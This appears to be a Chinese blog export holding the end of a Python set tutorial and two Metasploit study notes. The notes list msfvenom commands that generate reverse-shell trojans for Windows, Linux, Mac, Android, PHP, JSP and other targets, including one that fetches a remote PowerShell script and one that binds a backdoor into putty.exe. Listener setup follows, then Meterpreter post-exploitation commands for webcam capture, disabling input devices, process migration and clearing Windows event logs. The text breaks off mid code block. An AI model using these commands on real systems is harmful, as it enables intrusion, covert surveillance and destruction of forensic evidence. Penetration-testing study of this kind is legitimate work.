<span class="comment"># &#123;1, 3, 4, &#125;</span></span><br></pre></td></tr></table></figure><h3 id="（4）-update"><a href="#（4）-update" class="headerlink" title="（4）  update ( )"></a>（4）  update ( )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新集合</span></span><br><span class="line">s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, &#125;</span><br><span class="line">s1.update(&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(s1)           <span class="comment"># &#123;1, 2, 3, 4,5,6,8&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（5）-add"><a href="#（5）-add" class="headerlink" title="（5） add ( )"></a>（5） add ( )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 增加新值</span></span><br><span class="line">s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, &#125;</span><br><span class="line">s1.add(<span class="string">&#x27;ymn&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)     <span class="comment"># &#123;1,&#x27;ymn&#x27;, 2, 3, 4, &#125;</span></span><br></pre></td></tr></table></figure><h3 id="（6）-isdisjoint"><a href="#（6）-isdisjoint" class="headerlink" title="（6） isdisjoint ( )"></a>（6） isdisjoint ( )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断两个集合是否相互独立,即不存在交集</span></span><br><span class="line"><span class="built_in">print</span>(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;.isdisjoint(&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;))  <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h1 id="八、-总结"><a href="#八、-总结" class="headerlink" title="八、 总结"></a>八、 总结</h1><table><thead><tr><th>按照存值的个数区分</th><th>类型</th></tr></thead><tbody><tr><td>只存一个值,可以称为标量&#x2F;原子类型</td><td>数字(int,float),字符串</td></tr><tr><td>存放多个值 , 可以成为容器类型</td><td>列表,元组,字典,集合</td></tr></tbody></table><table><thead><tr><th>按照可变不可变区分</th><th>类型</th></tr></thead><tbody><tr><td>可变类型</td><td>列表,集合,字典</td></tr><tr><td>不可变类型</td><td>数字(int,float),元组,字符串</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF初体验（三）</title>
      <link href="/2022/05/04/msf_study_three/"/>
      <url>/2022/05/04/msf_study_three/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/808b62bbb4ca4c579e490db5e5e3cd26-20230403134833451.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;注意：本篇文章仅用于学习笔记记录与交流，不得用于其他违规用途。&#x3D;&#x3D;</p><h1 id="一、Msfvenom介绍"><a href="#一、Msfvenom介绍" class="headerlink" title="一、Msfvenom介绍"></a>一、Msfvenom介绍</h1><p>msf自带的有对应各个平台生成木马的工具msfvenom，而且不需要进入msf控制台，直接在命令行输入命令即可。<br>#二、Msfvenom参数介绍<br>##1、-l<br>列出指定模块的所有可用资源 , 模块类型包括 : payloads, encoders, nops, platforms, archs, encrypt, formats, all<br>##2、-p<br>指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</p><p>比如想查看windows&#x2F;meterpreter&#x2F;reverse_tcp支持什么平台、哪些选项，可以使用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp <span class="literal">--list-options</span></span><br></pre></td></tr></table></figure><h2 id="3、-f"><a href="#3、-f" class="headerlink" title="3、-f"></a>3、-f</h2><p>指定输出格式 (使用  –list formats 来获取msf支持的输出格式列表)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  <span class="literal">--list</span> formats</span><br></pre></td></tr></table></figure><h2 id="4、-e"><a href="#4、-e" class="headerlink" title="4、-e"></a>4、-e</h2><p>指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload如果你想查看所有支持的编码类型 , 使用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">--list</span> encoders</span><br></pre></td></tr></table></figure><h2 id="5、-a"><a href="#5、-a" class="headerlink" title="5、-a"></a>5、-a</h2><p>指定payload的目标架构，例如x86 | x64 | x86_64如果你想查看所有支持的架构 , 使用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">--list</span> archs</span><br></pre></td></tr></table></figure><h2 id="6、-o"><a href="#6、-o" class="headerlink" title="6、-o"></a>6、-o</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">指定创建好的payload的输出位置 , 没啥好说的</span><br></pre></td></tr></table></figure><h2 id="7、-b"><a href="#7、-b" class="headerlink" title="7、-b"></a>7、-b</h2><p>设定规避字符集，指定需要过滤的坏字符例 , 一般是和生成shellcode搭配使用<br>##8、-n<br>为payload预先指定一个NOP滑动长度<br>##9、-s<br>设定有效攻击荷载的最大长度，就是文件大小<br>##10、-i<br>指定payload的编码次数 , 后面接次数，表示编码的次数<br>##11、-c<br>添加自己的shellcode , 需要自己编写shellcode<br>##12、-x|-k<br>捆绑。例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。<br>##13、-v<br>指定一个自定义的变量，以确定输出格式<br>##14、-t<br>从STDIN读取有效负载时等待的秒数（默认值为30，0表示禁用）, 一般默认即可<br>##15、-h<br>查看帮助信息 , 没啥好说的<br>#三、Msfvenom生成实例<br>##1、生成一个windows木马</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">1.159</span> LPORT=<span class="number">8804</span> <span class="operator">-f</span> exe <span class="literal">-o</span> /tmp/payload.exe</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/af53de03a7504770a23c7a42311a0ed1.png" alt="在这里插入图片描述"></p><h2 id="2、规避指定字符"><a href="#2、规避指定字符" class="headerlink" title="2、规避指定字符"></a>2、规避指定字符</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="literal">-b</span> <span class="string">&#x27;\x00&#x27;</span> <span class="operator">-f</span> exe <span class="literal">-o</span> shell.exe</span><br><span class="line"></span><br><span class="line"><span class="literal">-b</span> 替换代码中会出现中断的字符</span><br></pre></td></tr></table></figure><h2 id="3、指定编码器"><a href="#3、指定编码器" class="headerlink" title="3、指定编码器"></a>3、指定编码器</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="literal">-b</span> <span class="string">&#x27;x00&#x27;</span> <span class="literal">-e</span> x86/shikata_ga_nai <span class="operator">-f</span> exe <span class="literal">-o</span> shell.exe</span><br></pre></td></tr></table></figure><h2 id="4、绑定后门到其他可执行程序上"><a href="#4、绑定后门到其他可执行程序上" class="headerlink" title="4、绑定后门到其他可执行程序上"></a>4、绑定后门到其他可执行程序上</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_http LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="literal">-x</span> /tmp/putty.exe <span class="literal">-k</span> <span class="operator">-f</span> exe <span class="literal">-o</span> /tmp/puuty_bind.exe</span><br></pre></td></tr></table></figure><h2 id="5、Windows木马"><a href="#5、Windows木马" class="headerlink" title="5、Windows木马"></a>5、Windows木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom –platform windows –a x86 –p windows/meterpreter/reverse_tcp –i <span class="number">3</span> –e x86/shikata_ga_nai –f exe –o /tmp/back.exe</span><br></pre></td></tr></table></figure><h2 id="6、Linux木马"><a href="#6、Linux木马" class="headerlink" title="6、Linux木马"></a>6、Linux木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="operator">-f</span> elf <span class="literal">-o</span> /tmp/shell.elf</span><br></pre></td></tr></table></figure><h2 id="7、Mac木马"><a href="#7、Mac木马" class="headerlink" title="7、Mac木马"></a>7、Mac木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="operator">-f</span> macho <span class="literal">-o</span> shell.macho</span><br></pre></td></tr></table></figure><h2 id="8、Android木马"><a href="#8、Android木马" class="headerlink" title="8、Android木马"></a>8、Android木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-a</span> x86 <span class="literal">--platform</span> android <span class="literal">-p</span> android/meterpreter/reverse_tcp LHOST=IP LPORT=<span class="number">8004</span> <span class="built_in">R</span>&gt; /tmppayload.apk</span><br></pre></td></tr></table></figure><h2 id="9、Powershell木马"><a href="#9、Powershell木马" class="headerlink" title="9、Powershell木马"></a>9、Powershell木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-a</span> x86 <span class="literal">--platform</span> Windows <span class="literal">-p</span> windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 <span class="literal">-e</span> cmd/powershell_base64 <span class="literal">-i</span> <span class="number">3</span> <span class="operator">-f</span> raw <span class="literal">-o</span> payload.ps1</span><br></pre></td></tr></table></figure><h2 id="10、PHP木马"><a href="#10、PHP木马" class="headerlink" title="10、PHP木马"></a>10、PHP木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="operator">-f</span> raw <span class="literal">-o</span> shell.php</span><br></pre></td></tr></table></figure><h2 id="11、ASP木马"><a href="#11、ASP木马" class="headerlink" title="11、ASP木马"></a>11、ASP木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="operator">-f</span> asp <span class="literal">-o</span> shell.asp</span><br></pre></td></tr></table></figure><h2 id="12、ASPX木马"><a href="#12、ASPX木马" class="headerlink" title="12、ASPX木马"></a>12、ASPX木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="operator">-f</span> aspx <span class="literal">-o</span> shell.aspx</span><br></pre></td></tr></table></figure><h2 id="13、JSP木马"><a href="#13、JSP木马" class="headerlink" title="13、JSP木马"></a>13、JSP木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="operator">-f</span> raw <span class="literal">-o</span> shell</span><br></pre></td></tr></table></figure><h2 id="14、War木马"><a href="#14、War木马" class="headerlink" title="14、War木马"></a>14、War木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="operator">-f</span> war <span class="literal">-o</span> shell.war</span><br></pre></td></tr></table></figure><h2 id="15、nodejs木马"><a href="#15、nodejs木马" class="headerlink" title="15、nodejs木马"></a>15、nodejs木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 <span class="operator">-f</span> raw <span class="literal">-o</span> payload.js</span><br></pre></td></tr></table></figure><h2 id="16、Bash木马"><a href="#16、Bash木马" class="headerlink" title="16、Bash木马"></a>16、Bash木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt;<span class="operator">-f</span> raw <span class="literal">-o</span> shell.sh</span><br></pre></td></tr></table></figure><h2 id="17、Perl木马"><a href="#17、Perl木马" class="headerlink" title="17、Perl木马"></a>17、Perl木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="operator">-f</span> raw <span class="literal">-o</span> shell.pl</span><br></pre></td></tr></table></figure><h2 id="18、Python木马"><a href="#18、Python木马" class="headerlink" title="18、Python木马"></a>18、Python木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> python/meterpreter_reverse_http LHOST=IP LPORT=<span class="number">7878</span> <span class="operator">-f</span> raw <span class="literal">-o</span> shell.py</span><br></pre></td></tr></table></figure><h2 id="19、ruby木马"><a href="#19、ruby木马" class="headerlink" title="19、ruby木马"></a>19、ruby木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 <span class="operator">-f</span> raw <span class="literal">-o</span> payload.rb</span><br></pre></td></tr></table></figure><h2 id="20、lua木马"><a href="#20、lua木马" class="headerlink" title="20、lua木马"></a>20、lua木马</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 <span class="operator">-f</span> raw <span class="literal">-o</span> payload.lua</span><br></pre></td></tr></table></figure><h2 id="21、exe利用exec执行powershell"><a href="#21、exe利用exec执行powershell" class="headerlink" title="21、exe利用exec执行powershell"></a>21、exe利用exec执行powershell</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/exec CMD=<span class="string">&quot;powershell.exe -nop -w hidden -c M.proxy=[Net.WebRequest]::GetSystemWebProxy();M.downloadstring(&#x27;http://IP:8080/4WFjDXrGo7Mj&#x27;);&quot;</span> <span class="operator">-f</span> exe <span class="literal">-e</span> x86/shikata_ga_nai <span class="literal">-i</span> <span class="number">6</span> <span class="literal">-o</span> msf.exe</span><br></pre></td></tr></table></figure><h2 id="22、windows-shellcode"><a href="#22、windows-shellcode" class="headerlink" title="22、windows shellcode"></a>22、windows shellcode</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_http LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="operator">-f</span> c</span><br><span class="line"></span><br><span class="line">msfvenom <span class="literal">-a</span> x86 <span class="literal">--platform</span> Windows <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 <span class="operator">-f</span> c</span><br></pre></td></tr></table></figure><h2 id="23、linux-shellcode"><a href="#23、linux-shellcode" class="headerlink" title="23、linux shellcode"></a>23、linux shellcode</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-a</span> x86 <span class="literal">--platform</span> Linux <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 <span class="operator">-f</span> c</span><br></pre></td></tr></table></figure><h2 id="24、mac-shellcode"><a href="#24、mac-shellcode" class="headerlink" title="24、mac shellcode"></a>24、mac shellcode</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-a</span> x86 <span class="literal">--platform</span> osx <span class="literal">-p</span> osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 <span class="operator">-f</span> c</span><br></pre></td></tr></table></figure><h1 id="四、MSF监听"><a href="#四、MSF监听" class="headerlink" title="四、MSF监听"></a>四、MSF监听</h1><p>当目标主机执行反弹木马后，会回连当前机器 ，需要设置端口监听</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">101.48</span> LPORT=<span class="number">8000</span> <span class="operator">-f</span> exe <span class="literal">-o</span> /tmp/payload.exe</span><br><span class="line"></span><br><span class="line">msfconsole <span class="literal">-q</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost IP    <span class="comment"># msf好像不支持监听本地ip , 变成0.0.0.0了</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="五、MSF和钉钉联动"><a href="#五、MSF和钉钉联动" class="headerlink" title="五、MSF和钉钉联动"></a>五、MSF和钉钉联动</h1><h2 id="1、创建群"><a href="#1、创建群" class="headerlink" title="1、创建群"></a>1、创建群</h2><h2 id="2、创建群机器人"><a href="#2、创建群机器人" class="headerlink" title="2、创建群机器人"></a>2、创建群机器人</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/cf88fc5e8a6b440484aac3d27c5b78cb.png" alt="在这里插入图片描述"><br>##3、复制webhook<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b9d7253d6fec4ad583cc1522c0c25eef.png" alt="在这里插入图片描述"><br>##4、msf中打开钉钉通知<br>##5、测试<br>进入msf后</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load <span class="literal">-l</span></span><br><span class="line">load session_notifier </span><br><span class="line">set_session_dingtalk_webhook https://oapi.dingtalk.com/robot/send?access_token=你的token</span><br><span class="line">start_session_notifier</span><br><span class="line"></span><br><span class="line">常规监听，run</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ef8cdeb905464c0e8124e78a2dd323f7.png" alt="在这里插入图片描述"><br>如果msf放后台</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt install screen</span><br><span class="line">screen <span class="literal">-S</span> msf                               <span class="comment"># 创建一个screen</span></span><br><span class="line">ctrl + a + d                                   <span class="comment"># 回到主窗口</span></span><br><span class="line">screen <span class="literal">-ls</span>                                      <span class="comment"># 列出所有的screen</span></span><br><span class="line">screen <span class="literal">-x</span> msf                               <span class="comment"># 恢复之前离线的screen作业</span></span><br><span class="line">screen <span class="literal">-S</span> 名字  <span class="literal">-X</span> quit                 <span class="comment">#  kill掉一个screen</span></span><br></pre></td></tr></table></figure><h1 id="六、RC文件"><a href="#六、RC文件" class="headerlink" title="六、RC文件"></a>六、RC文件</h1><p>如果你觉得每次 , 设置监听比较麻烦 , 你也可以将这些命令写进一个rc文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> handler.rc </span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">5656</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">run <span class="literal">-j</span></span><br><span class="line"></span><br><span class="line">msfconsole <span class="literal">-r</span> handler.rc</span><br></pre></td></tr></table></figure><p>或者一条命令监听<br>handler -p windows&#x2F;meterpreter&#x2F;reverse_tcp -H IP -P 8899</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 工具学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 工具学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF初体验（二）</title>
      <link href="/2022/05/04/msf_study_two/"/>
      <url>/2022/05/04/msf_study_two/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/808b62bbb4ca4c579e490db5e5e3cd26-20230403134857193.png" alt="在这里插入图片描述"></p><p>注意：本篇文章仅用于学习笔记记录与交流，不得用于其他违规用途。</p><h1 id="一、Meterpreter简介"><a href="#一、Meterpreter简介" class="headerlink" title="一、Meterpreter简介"></a>一、Meterpreter简介</h1><ul><li><p>Meterpreter 比系统 shell 更加灵活，功能更加丰富，例如监控主机，监控键盘，开启摄像头，麦克风，还可</p><p>以灵活的获取你的操作系统信息。</p></li><li><p>高级，动态，可扩展的 payload,一站式后攻击 payload；</p></li><li><p>基于 meterpreter 上下文利用更多漏洞发起攻击；</p></li><li><p>后渗透测试阶段一站式操作界面；</p></li><li><p>完全基于内存的 DLL 注入式 payload（不写硬盘）</p></li><li><p>注入合法系统进程并建立 stager</p></li><li><p>基于 stager 上传和预加载 DLL 进行扩展模块的注入(客户端 API)</p></li><li><p>基于 stager 建立的 socket 连接建立加密的 TLS&#x2F;1.0 通信隧道;</p></li><li><p>利用 TLS 隧道进一步加载后续扩展模块(避免网络取证</p></li></ul><h1 id="二、Meterpreter基本命令"><a href="#二、Meterpreter基本命令" class="headerlink" title="二、Meterpreter基本命令"></a>二、Meterpreter基本命令</h1><h2 id="1、系统命令"><a href="#1、系统命令" class="headerlink" title="1、系统命令"></a>1、系统命令</h2><h3 id="（1）基本系统命令"><a href="#（1）基本系统命令" class="headerlink" title="（1）基本系统命令"></a>（1）基本系统命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">background  <span class="comment">#将当前会话放置后台，然后可以再运行其他模块进行提权</span></span><br><span class="line"></span><br><span class="line">getuid <span class="comment"># 查看权限 </span></span><br><span class="line"></span><br><span class="line">getpid <span class="comment"># 获取当前进程的pid</span></span><br><span class="line"></span><br><span class="line">sysinfo <span class="comment"># 查看目标机系统信息</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ps</span> <span class="comment"># 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</span></span><br><span class="line"></span><br><span class="line">idletime <span class="comment">#查看目标机发呆（无操作）时间</span></span><br><span class="line"></span><br><span class="line">reboot / shutdown   <span class="comment">#重启/关机</span></span><br><span class="line"></span><br><span class="line">shell <span class="comment">#进入目标机cmd shell</span></span><br></pre></td></tr></table></figure><h3 id="（2）uictl开关键盘-x2F-鼠标"><a href="#（2）uictl开关键盘-x2F-鼠标" class="headerlink" title="（2）uictl开关键盘&#x2F;鼠标"></a>（2）uictl开关键盘&#x2F;鼠标</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uictl [<span class="type">enable</span>/<span class="type">disable</span>] [<span class="type">keyboard</span>/<span class="type">mouse</span>/<span class="type">all</span>]  <span class="comment">#开启或禁止键盘/鼠标</span></span><br><span class="line"></span><br><span class="line">uictl disable mouse  <span class="comment">#禁用鼠标</span></span><br><span class="line">uictl disable keyboard  <span class="comment">#禁用键盘</span></span><br></pre></td></tr></table></figure><h3 id="（3）webcam摄像头命令"><a href="#（3）webcam摄像头命令" class="headerlink" title="（3）webcam摄像头命令"></a>（3）webcam摄像头命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list         <span class="comment">#查看摄像头</span></span><br><span class="line">webcam_snap      <span class="comment">#通过摄像头拍照</span></span><br><span class="line">webcam_stream   <span class="comment">#通过摄像头开启视频</span></span><br></pre></td></tr></table></figure><h3 id="（4）执行exe文件"><a href="#（4）执行exe文件" class="headerlink" title="（4）执行exe文件"></a>（4）执行exe文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute <span class="operator">-f</span> c:\\<span class="number">111</span>.exe</span><br><span class="line"></span><br><span class="line">execute  <span class="literal">-H</span> <span class="literal">-i</span> <span class="operator">-f</span>  calc.exe</span><br><span class="line"><span class="comment"># execute -H -i -f cmd.exe    # 创建新进程cmd.exe，-H不可见，-i交互</span></span><br></pre></td></tr></table></figure><h3 id="（5）migrate进程迁移"><a href="#（5）migrate进程迁移" class="headerlink" title="（5）migrate进程迁移"></a>（5）migrate进程迁移</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getpid    <span class="comment"># 获取当前进程的pid</span></span><br><span class="line"><span class="built_in">ps</span>   <span class="comment"># 查看当前活跃进程</span></span><br><span class="line">migrate &lt;pid值&gt;    <span class="comment">#将Meterpreter会话移植到指定pid值进程中，</span></span><br><span class="line"><span class="built_in">kill</span> &lt;pid值&gt;   <span class="comment">#杀死进程</span></span><br></pre></td></tr></table></figure><h3 id="（6）clearav清楚日志"><a href="#（6）clearav清楚日志" class="headerlink" title="（6）clearav清楚日志"></a>（6）clearav清楚日志</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev  <span class="comment">#清除windows中的应用程序日志、系统日志、安全日志，走的时候不要忘记</span></span><br></pre></td></tr></table></figure><h2 id="2、文件系统命令"><a href="#2、文件系统命令" class="headerlink" title="2、文件系统命令"></a>2、文件系统命令</h2><h3 id="（1）基础命令"><a href="#（1）基础命令" class="headerlink" title="（1）基础命令"></a>（1）基础命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 